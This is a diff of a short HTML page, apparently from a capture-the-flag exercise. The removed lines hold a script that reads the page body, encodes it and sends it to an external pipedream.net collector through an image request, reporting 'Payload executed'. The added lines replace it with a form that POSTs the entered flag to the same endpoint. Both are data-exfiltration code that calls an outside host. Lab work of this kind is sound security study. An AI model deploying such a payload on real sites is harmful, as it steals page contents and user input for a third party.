@@ -1,18 +1,17 @@
-<!DOCTYPE html>
 <html>
-<head>
   <title id="getFlag">HI</title>
-</head>
-<body>
-  <p>flag</p>
-</body>
-<script>
-  var flagData = document.body.innerHTML;
-  var encodedFlagData = encodeURIComponent(flagData);
-  
-  var url = 'https://eoue93psy15d0ln.m.pipedream.net?data=' + encodedFlagData;
-  var img = new Image();
-  img.src = url;
-  document.getElementById("getFlag").innerText = 'Payload executed';
-</script>
+  <body>
+    <p>Enter flag: <input type="text" id="flagInput"></p>
+    <button onclick="sendFlag()">Send Flag</button>
+
+    <script>
+      function sendFlag() {
+        const flagValue = document.getElementById("flagInput").value;
+        fetch("https://eoue93psy15d0ln.m.pipedream.net", {
+          method: "POST",
+          body: flagValue
+        });
+      }
+    </script>
+  </body>
 </html>
